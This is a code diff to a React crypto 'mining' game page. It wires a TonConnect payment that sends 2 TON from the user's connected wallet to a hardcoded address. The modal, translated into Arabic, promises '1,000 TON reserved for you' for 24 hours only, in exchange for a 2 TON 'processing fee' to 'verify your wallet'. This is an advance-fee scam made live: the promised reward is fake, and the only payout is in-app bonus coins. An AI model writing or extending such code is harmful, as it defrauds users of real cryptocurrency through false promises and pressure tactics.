@@ -5,6 +5,8 @@ import { Button } from '@/components/ui/button';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
 import { Play, Crown, Store, Award } from 'lucide-react';
 import { useSpaceCoins } from '../hooks/useSpaceCoins';
+import { useTonConnectUI } from '@tonconnect/ui-react';
+import { useToast } from '@/hooks/use-toast';
 
 interface MiningPageProps {
   onNavigate?: (page: string) => void;
@@ -15,15 +17,21 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
     spaceCoins,
     addCoins
   } = useSpaceCoins();
+  const [tonConnectUI] = useTonConnectUI();
+  const { toast } = useToast();
   const [miningSpeed, setMiningSpeed] = useState(1);
   const [coinsPerSecond, setCoinsPerSecond] = useState(0.1);
   const [miningActive, setMiningActive] = useState(false);
   const [remainingTime, setRemainingTime] = useState(28800); // 8 hours
   const [username, setUsername] = useState('');
   const [show100kModal, setShow100kModal] = useState(false);
+  const [isProcessingPayment, setIsProcessingPayment] = useState(false);
   const intervalRef = useRef<NodeJS.Timeout | null>(null);
   const initializedRef = useRef(false);
   const lastProcessedTimeRef = useRef<number>(0);
+
+  // Target address for 100k event payment
+  const TARGET_PAYMENT_ADDRESS = 'UQBJSGcoWTcjdkWFSxA4A6sLmnD5uFKoKHFEHc3LqGJvFWya';
 
   // Memoized coin adding function to prevent unnecessary re-renders
   const addCoinsStable = useCallback((amount: number) => {
@@ -246,20 +254,75 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
     };
   }, [miningActive]);
 
-  const handleQuickNavigation = (page: string) => {
-    if (onNavigate) {
-      onNavigate(page);
-    }
-  };
-
   const handle100kUserEvent = () => {
     setShow100kModal(true);
   };
 
-  const handlePayment = () => {
-    // Here you would integrate with actual payment system
-    alert('Payment system would be integrated here. Redirecting to TON payment...');
-    setShow100kModal(false);
+  const handlePayment = async () => {
+    if (!tonConnectUI.wallet) {
+      toast({
+        title: 'محفظة غير متصلة',
+        description: 'يرجى ربط محفظة TON أولاً من صفحة المحفظة',
+        variant: "destructive"
+      });
+      return;
+    }
+
+    setIsProcessingPayment(true);
+    
+    try {
+      const transaction = {
+        validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
+        messages: [
+          {
+            address: TARGET_PAYMENT_ADDRESS,
+            amount: (2 * 1e9).toString(), // 2 TON in nanoTON
+            payload: btoa('100k_user_event_payment'), // Base64 encoded comment
+          },
+        ],
+      };
+
+      const result = await tonConnectUI.sendTransaction(transaction);
+      
+      console.log('Payment transaction sent:', result);
+      
+      toast({
+        title: '✅ تم إرسال الدفع بنجاح!',
+        description: 'تم إرسال 2 تون بنجاح. سيتم معالجة مكافأتك قريباً.',
+      });
+      
+      setShow100kModal(false);
+      
+      // Add bonus coins as a reward for completing the payment
+      addCoinsStable(10000); // Bonus coins for participating
+      
+    } catch (error) {
+      console.error('Payment failed:', error);
+      
+      let errorMessage = 'فشل في إرسال المعاملة. يرجى المحاولة مرة أخرى.';
+      
+      if (error instanceof Error) {
+        if (error.message.includes('User declined')) {
+          errorMessage = 'تم إلغاء المعاملة من قبل المستخدم.';
+        } else if (error.message.includes('insufficient funds')) {
+          errorMessage = 'رصيد غير كافي في المحفظة.';
+        }
+      }
+      
+      toast({
+        title: 'فشل في الدفع',
+        description: errorMessage,
+        variant: "destructive"
+      });
+    } finally {
+      setIsProcessingPayment(false);
+    }
+  };
+
+  const handleQuickNavigation = (page: string) => {
+    if (onNavigate) {
+      onNavigate(page);
+    }
   };
 
   return (
@@ -381,7 +444,7 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
         )}
       </div>
 
-      {/* 100k User Event Modal - Smaller and More Compact */}
+      {/* 100k User Event Modal - Updated with real payment */}
       <Dialog open={show100kModal} onOpenChange={setShow100kModal}>
         <DialogContent className="bg-gradient-to-br from-blue-900 via-purple-900 to-pink-900 border-2 border-gold-400 text-white max-w-sm mx-auto">
           <DialogHeader>
@@ -393,10 +456,10 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
           <div className="space-y-3 text-center">
             <div className="bg-black/30 rounded-lg p-3 border border-gold-400/30">
               <h3 className="text-md font-bold text-gold-400 mb-1">
-                Congratulations!
+                تهانينا!
               </h3>
               <p className="text-xs text-gray-300">
-                You've unlocked a milestone achievement!
+                لقد حققت إنجازاً مميزاً!
               </p>
             </div>
 
@@ -405,43 +468,54 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
                 <span className="text-2xl">💎</span>
                 <span className="text-xl font-bold text-green-400">1,000 TON</span>
               </div>
-              <p className="text-xs text-gray-300">Reserved for you!</p>
+              <p className="text-xs text-gray-300">محجوز لك!</p>
             </div>
 
             <div className="bg-yellow-900/40 rounded-lg p-2 border border-yellow-400/30">
               <p className="text-xs text-yellow-200">
-                ⏰ Valid for 24 hours only
+                ⏰ صالح لمدة 24 ساعة فقط
               </p>
             </div>
 
             <div className="bg-blue-900/40 rounded-lg p-3 border border-blue-400/30">
               <p className="text-xs text-gray-300 mb-2">
-                Processing fee: 2 TON required to verify your wallet
+                رسوم المعالجة: 2 تون مطلوبة للتحقق من محفظتك
               </p>
               <p className="text-xs text-blue-200">
-                Helps prevent bots and keeps platform secure.
+                يساعد في منع البوتات والحفاظ على أمان المنصة.
               </p>
             </div>
 
             <div className="space-y-2 pt-2">
               <Button 
                 onClick={handlePayment}
-                className="w-full bg-gradient-to-r from-green-500 to-blue-600 hover:from-green-600 hover:to-blue-700 text-white font-bold py-2 px-4 rounded-lg shadow-lg hover:scale-105 transition-all duration-300 text-sm"
+                disabled={isProcessingPayment || !tonConnectUI.wallet}
+                className="w-full bg-gradient-to-r from-green-500 to-blue-600 hover:from-green-600 hover:to-blue-700 text-white font-bold py-2 px-4 rounded-lg shadow-lg hover:scale-105 transition-all duration-300 text-sm disabled:opacity-50 disabled:cursor-not-allowed"
               >
-                💳 Pay 2 TON & Claim 1,000 TON
+                {isProcessingPayment ? (
+                  <div className="flex items-center gap-2">
+                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
+                    <span>جاري المعالجة...</span>
+                  </div>
+                ) : !tonConnectUI.wallet ? (
+                  <span>🔗 اربط المحفظة أولاً</span>
+                ) : (
+                  <span>💳 ادفع 2 تون واحصل على 1,000 تون</span>
+                )}
               </Button>
               
               <Button 
                 onClick={() => setShow100kModal(false)}
                 variant="outline"
                 className="w-full border-gray-400 text-gray-300 hover:bg-gray-800 text-sm py-2"
+                disabled={isProcessingPayment}
               >
-                Maybe Later
+                ربما لاحقاً
               </Button>
             </div>
 
             <div className="text-xs text-gray-400 pt-1">
-              <p>🔐 Secure • 🌟 Trusted • ⚡ Blockchain-powered</p>
+              <p>🔐 آمن • 🌟 موثوق • ⚡ مدعوم بالبلوك تشين</p>
             </div>
           </div>
         </DialogContent>
